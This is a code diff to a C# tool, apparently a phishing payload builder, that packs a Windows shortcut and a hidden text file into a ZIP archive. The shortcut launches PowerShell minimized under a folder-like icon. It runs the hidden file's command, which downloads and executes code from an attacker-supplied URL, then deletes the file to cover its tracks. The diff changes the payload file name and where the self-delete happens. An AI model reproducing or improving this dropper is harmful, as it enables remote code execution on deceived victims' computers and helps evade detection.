@@ -39,7 +39,7 @@ class Program
 
         string curDir = AppDomain.CurrentDomain.BaseDirectory;
         string lnkFilePath = Path.Combine(curDir, lnkName + ".lnk");
-        string ps1FilePath = Path.Combine(curDir, "backup.txt");
+        string ps1FilePath = Path.Combine(curDir, lnkName + ".txt");
         string zipFilePath = Path.Combine(curDir, zipFile + ".zip");
 
         Console.ForegroundColor = ConsoleColor.Cyan;
@@ -59,20 +59,19 @@ A simple .zip packer for LNK files - calfcrusher@inventati.org
 
         Console.ResetColor();
         Console.WriteLine();
-        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content));Remove-Item $MyInvocation.MyCommand.Definition -Force";
+        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))";
 
         File.WriteAllText(ps1FilePath, psContent);
 
         SetFileHidden(ps1FilePath);
 
-        CreateShortcut(lnkFilePath, ps1FilePath);
+        CreateShortcut(lnkFilePath, ps1FilePath, lnkName);
 
         CreateZip(zipFilePath, new[] { lnkFilePath, ps1FilePath });
 
         Console.ForegroundColor = ConsoleColor.Green;
         Console.WriteLine("[+] ZIP file created: " + zipFilePath);
         Console.ResetColor();
-
 
         try
         {
@@ -85,7 +84,7 @@ A simple .zip packer for LNK files - calfcrusher@inventati.org
         }
     }
 
-    static void CreateShortcut(string shortcutPath, string targetFilePath)
+    static void CreateShortcut(string shortcutPath, string targetFilePath, string lnkName)
     {
         Type shellType = Type.GetTypeFromProgID("WScript.Shell")
                          ?? throw new InvalidOperationException("WScript.Shell is not available.");
@@ -97,7 +96,7 @@ A simple .zip packer for LNK files - calfcrusher@inventati.org
 
         // Set properties for the shortcut
         shortcut.TargetPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
-        shortcut.Arguments = $"Get-Content .\\backup.txt | Invoke-Expression";
+        shortcut.Arguments = $"Get-Content .\\{lnkName}.txt | Invoke-Expression; Remove-Item -Path '.\\{lnkName}.txt' -Force";
         shortcut.IconLocation = @"C:\Windows\System32\imageres.dll, 3";
         shortcut.WindowStyle = 7;
         shortcut.Save();
